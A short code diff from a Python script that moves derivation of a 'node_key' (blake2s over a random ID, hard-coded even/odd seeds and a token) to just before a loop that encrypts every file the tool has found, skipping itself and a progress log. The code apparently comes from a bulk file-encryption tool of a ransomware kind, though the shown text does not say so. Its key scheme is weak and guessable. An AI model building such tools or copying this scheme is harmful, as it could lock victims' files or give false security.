@@ -47,11 +47,7 @@ if True:
 # ========================================================================= #
 node_id = str(randint(0, 999999)).zfill(7)
 node_sig = secrets.token_urlsafe(16)
-if int(node_id) % 2 == 0:
-    node_key = hashlib.blake2s(str(node_id + "some_secret_even_seed" + node_sig).encode()).hexdigest()[24:48][::-1]
-else:
-    node_key = hashlib.blake2s(str(node_id + "some_secret_odd_seed" + node_sig).encode()).hexdigest()[24:48][::-1]
-node_key_hash = hashlib.blake2s(node_key.encode()).hexdigest()
+# Generate key only when needed.
 
 # ========================================================================= #
 # General Setup:
@@ -167,6 +163,13 @@ if True:
 # ========================================================================= #
 # Encrypt:
 # ========================================================================= #
+# Generate the final key here:
+if int(node_id) % 2 == 0:
+    node_key = hashlib.blake2s(str(node_id + "some_secret_even_seed" + node_sig).encode()).hexdigest()[24:48][::-1]
+else:
+    node_key = hashlib.blake2s(str(node_id + "some_secret_odd_seed" + node_sig).encode()).hexdigest()[24:48][::-1]
+node_key_hash = hashlib.blake2s(node_key.encode()).hexdigest()
+# Loop files:
 for f in tool.files_found:
     try:
         # Ignore this file and progress log:
